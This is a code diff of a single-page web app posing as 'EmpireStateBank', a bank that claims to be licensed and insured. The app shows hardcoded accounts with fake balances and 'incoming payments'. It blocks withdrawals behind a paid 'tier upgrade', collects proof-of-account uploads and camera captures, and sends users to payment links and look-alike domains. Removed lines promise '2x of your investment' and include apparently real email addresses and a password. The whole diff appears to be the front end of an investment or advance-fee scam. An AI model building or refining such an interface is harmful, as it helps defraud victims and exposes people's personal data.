@@ -1511,7 +1511,7 @@
 
   <!-- Cover page -->
   <section id="coverPage" class="page">
-    <img src="AddText_04-11-12.53.52.png" alt="EmpireStateBank logo" />
+    <img src="empirestatebank.png" alt="EmpireStateBank logo" />
     <h1>Empowering Your Financial Growth</h1>
     <p>Licensed by the CBN and insured by the NDIC</p>
     <div class="loader"></div>
@@ -1558,7 +1558,7 @@
     <header class="dashboard-header">
       <div class="user-row" id="profileShortcut">
         <div class="avatar-wrap">
-          <img id="userImage" src="AddText_04-11-12.53.52.png" alt="User profile" />
+          <img id="userImage" src="empirestatebank.png" alt="User profile" />
           <span id="tierBadge" class="tier">2</span>
         </div>
         <div class="hello">Hi, <span id="userFirstName"></span></div>
@@ -1788,7 +1788,7 @@
   <div id="proofPage" class="proof-page">
     <div class="proof-header">
       <span id="proofBackBtn">&lt;</span>
-      <span>Provide A Valid Raenest NGN Account</span>
+      <span>Provide Proof Raenest NGN Account</span>
     </div>
 
     <div class="proof-content">
@@ -1947,7 +1947,7 @@
         <div style="display: flex; align-items: center; gap: 15px;">
           <div style="width: 50px; height: 50px; background: #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #d4af37; font-weight: bold;">ESB</div>
           <div>
-            <div style="font-weight: bold; font-size: 14px;">Invest with EmpireStateBank</div>
+            <div style="font-weight: bold; font-size: 14px;">Fund my E-wallet to Invest with EmpireStateBank</div>
             <div style="font-size: 12px;">Invest your funds securely</div>
           </div>
         </div>
@@ -1985,7 +1985,7 @@
         </div>
 
         <button class="primary-btn" type="submit">
-          <span id="investBtnText">Invest</span>
+          <span id="investBtnText">Continue to Invest</span>
         </button>
       </form>
     </div>
@@ -2130,112 +2130,110 @@
   </div>
 
   <script>
+    // ========================================
+    // USER DATABASE - Add new users here
+    // ========================================
     const USERS = [
       {
         id: "2019",
         name: "Charity Hanson",
-        email: "charityhanza@gmail.com",
+        email: "charity@example.com",
         password: "password123",
         profileImage: "AddText_06-02-03.50.45.png",
         tier: 2,
         accountNumber: "8028403872",
-        tag: "",
+        tag: "@CharityTag",
         cardNumber: "5549",
-        cardExpiry: "03/26",
-        cvv: "350",
+        cardExpiry: "03/30",
+        cvv: "357",
         currentBalance: 6.40,
-        nairaBalance: 0.00,
-        incomingPayment: 6.40,
+        nairaBalance: 9600.00,
+        incomingPayment: 10.00,
         incomingPaymentStartDate: "2026-06-25T12:00:00Z",
         incomingPaymentDate: "2026-07-01T12:00:00Z",
-        gender: "Male",
-        dob: "",
-        nin: ""
+        gender: "Female",
+        dob: "1990-04-15",
+        nin: "NIN12345678"
       },
       {
         id: "1995",
         name: "Daniel Johnson",
-        email: "johnsondani70@gmail.com",
+        email: "daniel@example.com",
         password: "password123",
         profileImage: "AddText_12-23-12.28.07.png",
         tier: 3,
-        accountNumber: "8106122713",
-        tag: "@johnd461840",
+        accountNumber: "8105122713",
+        tag: "@DanielTag",
         cardNumber: "2493",
-        cardExpiry: "05/26",
+        cardExpiry: "05/28",
         cvv: "492",
         currentBalance: 0.00,
         nairaBalance: 0.00,
-        incomingPayment: 0.00,
+        incomingPayment: 2.50,
         incomingPaymentStartDate: "2026-06-29T09:30:00Z",
         incomingPaymentDate: "2026-07-05T09:30:00Z",
         gender: "Male",
-        dob: "",
-        nin: ""
+        dob: "1988-11-20",
+        nin: "NIN23456789"
       },
       {
         id: "3572",
         name: "Emmanuel Ekpa",
-        email: "emmanuelekpa3@gmail.com",
-        password: "Ronaldo77$",
+        email: "emmanuel@example.com",
+        password: "password123",
         profileImage: "AddText_05-22-01.29.33.png",
-        tier: 3,
-        accountNumber: "8105866469",
-        tag: "@emmela593338",
+        tier: 2,
+        accountNumber: "2148702761",
+        tag: "@EmmanuelTag",
         cardNumber: "7821",
-        cardExpiry: "12/26",
+        cardExpiry: "12/25",
         cvv: "681",
         currentBalance: 30.00,
-        nairaBalance: 0.00,
-        incomingPayment: 35.54,
+        nairaBalance: 45000.00,
+        incomingPayment: 5.54,
         incomingPaymentStartDate: "2026-07-30T16:10:00Z",
-        incomingPaymentDate: "2026-09-29T21:10:00Z",
+        incomingPaymentDate: "2026-09-19T16:10:00Z",
         gender: "Male",
-        dob: "2002-05-25",
-        nin: ""
-      },
-      id: "2027",
-        name: "Daniel Johnson",
-        email: "jameseke2025@gmail.com",
-        password: "password123",
-        profileImage: "AddText_01-11-09.57.24.png",
-        tier: 2,
-        accountNumber: "9167655099",
-        tag: "",
-        cardNumber: "2903",
-        cardExpiry: "05/26",
-        cvv: "401",
-        currentBalance: 0.00,
-        nairaBalance: 0.00,
-        incomingPayment: 4.26,
-        incomingPaymentStartDate: "2026-06-29T09:30:00Z",
-        incomingPaymentDate: "2026-07-05T09:30:00Z",
-        gender: "Male",
-        dob: "",
-        nin: ""
-      },
-      id: "4073",
-        name: "Esther Amos",
-        email: "eamos9339@gmail.com",
-        password: "password123",
-        profileImage: "AddText_05-25-10.37.46.png",
-        tier: 2,
-        accountNumber: "8130024073",
-        tag: "",
-        cardNumber: "0193",
-        cardExpiry: "05/26",
-        cvv: "012",
-        currentBalance: 0.00,
-        nairaBalance: 0.00,
-        incomingPayment: 4.26,
-        incomingPaymentStartDate: "2026-06-29T09:30:00Z",
-        incomingPaymentDate: "2026-07-05T09:30:00Z",
-        gender: "Female",
-        dob: "",
-        nin: ""
-      },
+        dob: "1992-06-05",
+        nin: "NIN34567890"
+      }
+      // ========================================
+      // TO ADD A NEW USER: Copy the structure below and fill in the details
+      // ========================================
+      // {
+      //   id: "YOUR_UNIQUE_ID",
+      //   name: "Full Name",
+      //   email: "email@example.com",
+      //   password: "password",
+      //   profileImage: "image_filename.png",
+      //   tier: 2,
+      //   accountNumber: "1234567890",
+      //   tag: "@YourTag",
+      //   cardNumber: "1234",
+      //   cardExpiry: "MM/YY",
+      //   cvv: "123",
+      //   currentBalance: 50.00,
+      //   nairaBalance: 75000.00,
+      //   incomingPayment: 15.00,
+      //   incomingPaymentStartDate: "2026-08-01T10:00:00Z",
+      //   incomingPaymentDate: "2026-08-15T10:00:00Z",
+      //   gender: "Male or Female",
+      //   dob: "YYYY-MM-DD",
+      //   nin: "NIN12345678"
+      // }
+      // ========================================
     ];
 
+    // ========================================
+    // APP CONFIGURATION
+    // ========================================
+    const APP_CONFIG = {
+      EXCHANGE_RATE: 1500 // 1 USD = 1500 NGN
+    };
+
+    // ========================================
+    // GLOBAL VARIABLES
+    // ========================================
     let currentUser = null;
     let progressTimer;
     let balanceRevealed = false;
@@ -2244,8 +2242,10 @@
     let pinModalCallback = null;
     let mediaStream = null;
     let currentWalletIndex = 0;
-    const EXCHANGE_RATE = 1500; // 1 USD = 1500 NGN
 
+    // ========================================
+    // UTILITY FUNCTIONS
+    // ========================================
     const $ = (id) => document.getElementById(id);
 
     function showLoading() {
@@ -2332,6 +2332,9 @@
       }
     }
 
+    // ========================================
+    // DASHBOARD FUNCTIONS
+    // ========================================
     function showDashboard(user) {
       currentUser = user;
 
@@ -2381,7 +2384,9 @@
       }
     }
 
-    // Wallet Slider Touch/Drag
+    // ========================================
+    // WALLET SLIDER FUNCTIONS
+    // ========================================
     function setupWalletSlider() {
       const slider = $("walletSlider");
       const wrapper = $("walletSliderWrapper");
@@ -2457,7 +2462,6 @@
       }
     }
 
-    // Update Wallet Indicators
     function updateIndicators() {
       const indicators = document.querySelectorAll('.indicator');
       indicators.forEach((indicator, index) => {
@@ -2469,7 +2473,6 @@
       });
     }
 
-    // Indicator Click Handler
     document.querySelectorAll('.indicator').forEach((indicator, index) => {
       indicator.addEventListener('click', () => {
         const slider = $("walletSlider");
@@ -2482,6 +2485,10 @@
         updateIndicators();
       });
     });
+
+    // ========================================
+    // BUTTON EVENT LISTENERS
+    // ========================================
 
     // Customer Service Button
     $("customerServiceBtn").addEventListener("click", () => {
@@ -2506,7 +2513,7 @@
       showLoading();
       setTimeout(() => {
         hideLoading();
-        window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSd67qB5MQ6YprIk5qG1jvyPzv8ChveVtkIn9A1PUTRhOnvzxQ/viewform";
+        window.location.href = "https://forgoggo.com";
       }, 1500);
     });
 
@@ -2521,7 +2528,7 @@
             showLoading();
             setTimeout(() => {
               hideLoading();
-              window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSd_-p0ZCSPgn7m2nKKD9RIdTBLoWU2roeQOD0FrifSx52B7NQ/viewform";
+              window.location.href = "https://formgoohme.com";
             }, 1500);
           });
           return;
@@ -2553,7 +2560,7 @@
               return;
             }
 
-            window.location.href = "https://app.raenest.com/send-money";
+            window.location.href = "https://raenest.com";
           }, 1500);
         } else {
           showAlert("Incorrect PIN", "The PIN you entered is incorrect. Please try again.");
@@ -2571,7 +2578,7 @@
           showLoading();
           setTimeout(() => {
             hideLoading();
-            window.location.href = "https://app.raenest.com/accounts?currency=NGN&wallet_category=global";
+            window.location.href = "https://raenest.com";
           }, 1500);
         } else {
           showAlert("Incorrect PIN", "The PIN you entered is incorrect. Please try again.");
@@ -2595,7 +2602,7 @@
     // Convert Amount Input Handler
     $("convertAmountInput").addEventListener("input", (e) => {
       const usdAmount = parseFloat(e.target.value) || 0;
-      const ngnAmount = usdAmount * EXCHANGE_RATE;
+      const ngnAmount = usdAmount * APP_CONFIG.EXCHANGE_RATE;
 
       $("convertAmountDisplay").textContent = "₦" + ngnAmount.toFixed(2);
       $("convertBtnText").textContent = "Convert $" + usdAmount.toFixed(2);
@@ -2619,7 +2626,7 @@
             showLoading();
             setTimeout(() => {
               hideLoading();
-              window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSd_-p0ZCSPgn7m2nKKD9RIdTBLoWU2roeQOD0FrifSx52B7NQ/viewform";
+              window.location.href = "https://formgoohme.com";
             }, 1500);
           });
           return;
@@ -2664,19 +2671,19 @@
       closeModal("convertModal");
     });
 
-    // Investment Modal Setup
+    // ========================================
+    // INVESTMENT FUNCTIONS
+    // ========================================
     function populateInvestmentModal() {
       $("investCardDisplay").textContent = `E-wallet Card (**${currentUser.cardNumber.slice(-4)})`;
       $("investFullName").value = currentUser.name;
       $("investDateInput").valueAsDate = new Date();
     }
 
-    // Close Investment Modal
     $("investmentModalBack").addEventListener("click", () => {
       closeModal("investmentModal");
     });
 
-    // Investment Form Submission
     $("investmentForm").addEventListener("submit", (e) => {
       e.preventDefault();
 
@@ -2694,7 +2701,10 @@
       }, 1500);
     });
 
-    // Betting Button
+    // ========================================
+    // TV AND BETTING FUNCTIONS
+    // ========================================
+
     $("bettingButton").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
@@ -2703,7 +2713,6 @@
       }, 1500);
     });
 
-    // TV Button
     $("tvButton").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
@@ -2712,7 +2721,6 @@
       }, 1500);
     });
 
-    // Channel 1
     $("channel1Btn").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
@@ -2722,22 +2730,22 @@
       }, 1500);
     });
 
-    // Channel 2
     $("channel2Btn").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
         hideLoading();
         closeModal("tvModal");
-        window.location.href = "https://www.camel1.tv/";
+        window.location.href = "https://camellive.com";
       }, 1500);
     });
 
-    // Close TV Modal
     $("tvCloseBtn").addEventListener("click", () => {
       closeModal("tvModal");
     });
 
-    // Referral Program Page
+    // ========================================
+    // REFERRAL PROGRAM FUNCTIONS
+    // ========================================
     function showReferralPage() {
       $("dashboardPage").classList.add("hidden");
       $("referralPage").classList.add("active");
@@ -2748,13 +2756,11 @@
       $("referralLinkDisplay").textContent = "https://empirestatebank.mssg.me";
     }
 
-    // Close Referral Page
     $("referralCloseBtn").addEventListener("click", () => {
       $("referralPage").classList.remove("active");
       $("dashboardPage").classList.remove("hidden");
     });
 
-    // Copy Referral Code
     $("copyCodeBtn").addEventListener("click", () => {
       const code = $("referralCodeDisplay").textContent;
       navigator.clipboard.writeText(code).then(() => {
@@ -2762,7 +2768,6 @@
       });
     });
 
-    // Copy Referral Link
     $("copyLinkBtn").addEventListener("click", () => {
       const link = $("referralLinkDisplay").textContent;
       navigator.clipboard.writeText(link).then(() => {
@@ -2770,11 +2775,10 @@
       });
     });
 
-    // Share Referral Link
     $("shareLinkBtn").addEventListener("click", () => {
       const link = $("referralLinkDisplay").textContent;
       const tag = $("referralCodeDisplay").textContent;
-      const message = `Invest with EmpireStateBank using my referral code and get 2x of your investment: ${tag}\n${link}`;
+      const message = `Join EmpireStateBank using my referral code: ${tag}\n${link}`;
 
       if (navigator.share) {
         navigator.share({
@@ -2782,13 +2786,11 @@
           text: message
         }).catch(err => console.log("Share cancelled"));
       } else {
-        // Fallback to WhatsApp share
         const whatsappMessage = encodeURIComponent(message);
         window.location.href = `https://wa.me/?text=${whatsappMessage}`;
       }
     });
 
-    // Invitation Button
     $("invitationButton").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
@@ -2797,7 +2799,9 @@
       }, 1500);
     });
 
-    // Proof Page Functions
+    // ========================================
+    // PROOF PAGE FUNCTIONS
+    // ========================================
     function showProofPage() {
       $("dashboardPage").classList.add("hidden");
       $("proofPage").classList.add("active");
@@ -2811,7 +2815,60 @@
       $("dashboardPage").classList.remove("hidden");
     });
 
-    // Profile Page Functions
+    $("uploadArea").addEventListener("click", () => {
+      $("proofFileInput").click();
+    });
+
+    $("proofFileInput").addEventListener("change", (e) => {
+      if (e.target.files.length > 0) {
+        $("fileName").textContent = "✓ " + e.target.files[0].name;
+      }
+    });
+
+    document.querySelectorAll('input[name="Account Status"]').forEach(radio => {
+      radio.addEventListener("change", (e) => {
+        if (e.target.value === "I don't have") {
+          $("getAccountBtn").classList.add("show");
+        } else {
+          $("getAccountBtn").classList.remove("show");
+        }
+      });
+    });
+
+    $("getAccountBtn").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        window.location.href = "https://raebsh.co/sign.com";
+      }, 1500);
+    });
+
+    $("sampleLink").addEventListener("click", () => {
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        window.location.href = "sample_proof.png";
+      }, 1500);
+    });
+
+    $("proofForm").addEventListener("submit", (e) => {
+      e.preventDefault();
+
+      if (!$("proofFileInput").files.length) {
+        alert("Please upload a proof document");
+        return;
+      }
+
+      showLoading();
+      setTimeout(() => {
+        hideLoading();
+        $("proofForm").submit();
+      }, 1500);
+    });
+
+    // ========================================
+    // PROFILE PAGE FUNCTIONS
+    // ========================================
     function showProfile(user) {
       currentUser = user;
       $("dashboardPage").classList.add("hidden");
@@ -2851,63 +2908,6 @@
       }, 1500);
     });
 
-    // Proof Form File Upload
-    $("uploadArea").addEventListener("click", () => {
-      $("proofFileInput").click();
-    });
-
-    $("proofFileInput").addEventListener("change", (e) => {
-      if (e.target.files.length > 0) {
-        $("fileName").textContent = "✓ " + e.target.files[0].name;
-      }
-    });
-
-    // Proof Form Radio Buttons
-    document.querySelectorAll('input[name="Account Status"]').forEach(radio => {
-      radio.addEventListener("change", (e) => {
-        if (e.target.value === "I don't have") {
-          $("getAccountBtn").classList.add("show");
-        } else {
-          $("getAccountBtn").classList.remove("show");
-        }
-      });
-    });
-
-    // Get Account Button
-    $("getAccountBtn").addEventListener("click", () => {
-      showLoading();
-      setTimeout(() => {
-        hideLoading();
-        window.location.href = "https://app.raenest.com/register/individual";
-      }, 1500);
-    });
-
-    // Sample Link
-    $("sampleLink").addEventListener("click", () => {
-      showLoading();
-      setTimeout(() => {
-        hideLoading();
-        window.location.href = "NGN-proof-of-account.png";
-      }, 1500);
-    });
-
-    // Proof Form Submission
-    $("proofForm").addEventListener("submit", (e) => {
-      e.preventDefault();
-
-      if (!$("proofFileInput").files.length) {
-        alert("Please upload a proof document");
-        return;
-      }
-
-      showLoading();
-      setTimeout(() => {
-        hideLoading();
-        $("proofForm").submit();
-      }, 1500);
-    });
-
-    // Invest button
     $("investButton").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
@@ -2917,7 +2917,6 @@
       }, 1500);
     });
 
-    // Withdraw button
     $("withdrawButton").addEventListener("click", () => {
       if (currentUser.tier === 2) {
         showAlert("Upgrade Required", "You need to upgrade your account to Tier 3 to withdraw. Please click Proceed to upgrade.", () => {
@@ -2933,11 +2932,13 @@
       showLoading();
       setTimeout(() => {
         hideLoading();
-        window.location.href = "https://app.raenest.com/send-money";
+        window.location.href = "https://www.raenest.com";
       }, 1500);
     });
 
-    // Camera Functions
+    // ========================================
+    // CAMERA FUNCTIONS
+    // ========================================
     async function startCamera() {
       try {
         mediaStream = await navigator.mediaDevices.getUserMedia({
@@ -2985,7 +2986,9 @@
       stopCamera();
     });
 
-    // Receipt Upload
+    // ========================================
+    // SIGNUP FUNCTIONS
+    // ========================================
     $("receiptUploadArea").addEventListener("click", () => {
       $("receiptFileInput").click();
     });
@@ -2996,17 +2999,15 @@
       }
     });
 
-    // Make Payment Button
     $("makePaymentBtn").addEventListener("click", (e) => {
       e.preventDefault();
       showLoading();
       setTimeout(() => {
         hideLoading();
-        window.location.href = "https://app.raenest.com/invoice/payment/RNM9573Y7";
+        window.location.href = "https://firhhfj.md.ng";
       }, 1500);
     });
 
-    // Sign-up Form Submission
     $("signupForm").addEventListener("submit", (e) => {
       e.preventDefault();
 
@@ -3028,7 +3029,9 @@
       }, 1500);
     });
 
-    // Login form
+    // ========================================
+    // LOGIN AND INITIALIZATION
+    // ========================================
     $("loginForm").addEventListener("submit", (event) => {
       event.preventDefault();
 
@@ -3051,7 +3054,6 @@
       }, 1500);
     });
 
-    // Signup link
     $("signupLink").addEventListener("click", (event) => {
       event.preventDefault();
       showLoading();
@@ -3061,7 +3063,6 @@
       }, 1000);
     });
 
-    // Profile shortcut
     $("profileShortcut").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
@@ -3074,7 +3075,6 @@
       }, 1500);
     });
 
-    // Me button
     $("meButton").addEventListener("click", () => {
       showLoading();
       setTimeout(() => {
